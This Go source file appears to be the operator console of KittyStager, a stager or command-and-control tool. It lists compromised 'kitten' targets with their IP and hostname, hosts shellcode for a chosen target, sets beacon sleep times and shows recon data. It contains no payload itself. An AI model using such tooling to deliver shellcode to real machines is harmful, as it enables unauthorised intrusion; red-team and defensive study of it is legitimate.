package interact

import (
	"KittyStager/cmd/http"
	"KittyStager/cmd/httpUtil"
	"KittyStager/cmd/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"os"
	"strconv"
	"strings"
)

func Interact(kittenName string) error {
	in := fmt.Sprintf("KittyStager - %s❯ ", kittenName)
	for {
		t := prompt.Input(in, completer,
			prompt.OptionPrefixTextColor(prompt.Blue),
			prompt.OptionPreviewSuggestionTextColor(prompt.Green),
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
			prompt.OptionSelectedSuggestionTextColor(prompt.Blue),
			prompt.OptionDescriptionBGColor(prompt.Blue),
			prompt.OptionSuggestionBGColor(prompt.DarkGray))
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			os.Exit(1337)
		case "back":
			return nil
		case "target":
			PrintTarget()
		case "shellcode":
			if kittenName == "all targets" {
				fmt.Println(color.Red("You can't host shellcode on all targets"))
				break
			}
			fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the shellcode"))
			var path string
			path, err := i.Read("Path: ")
			if err != nil {
				util.ErrPrint(err)
				break
			}
			err = httpUtil.HostShellcode(path, kittenName)
			if err != nil {
				util.ErrPrint(err)
				break
			}
		case "sleep":
			if len(input) != 2 {
				util.ErrPrint(fmt.Errorf("invalid input"))
				break
			}
			time, err := strconv.Atoi(input[1])
			if err != nil {
				util.ErrPrint(err)
				break
			}
			httpUtil.HostSleep(time, kittenName)
		case "recon":
			initChecks := http.Targets[kittenName].GetInitChecks()
			util.PrintRecon(initChecks)
		}
	}
	return nil
}

func PrintTarget() {
	fmt.Printf("\n%s\n", color.Green("[*] Targets:"))
	fmt.Printf("%s\n", color.Green("Id:\tKitten name:\tIp:\t\tHostname:\t\tLast seen:\tSleep:"))
	fmt.Printf("%s\n", color.Green("═══\t════════════\t═══\t\t═════════\t\t══════════\t══════"))

	for name, x := range http.Targets {
		fmt.Printf("%d\t%s\t%s\t%s\t\t%s\t%s\n",
			x.GetId(),
			color.Yellow(name),
			color.Yellow(x.InitChecks.GetIp()),
			color.Yellow(x.InitChecks.GetHostname()),
			color.Yellow(x.GetLastSeen()),
			color.Yellow(x.GetShellcode()),
		)
	}
	fmt.Println()
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "back", Description: "Go back to the main menu"},
		{Text: "target", Description: "Show targets"},
		{Text: "shellcode", Description: "Host shellcode"},
		{Text: "sleep", Description: "Set sleep time"},
		{Text: "recon", Description: "Show recon information"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
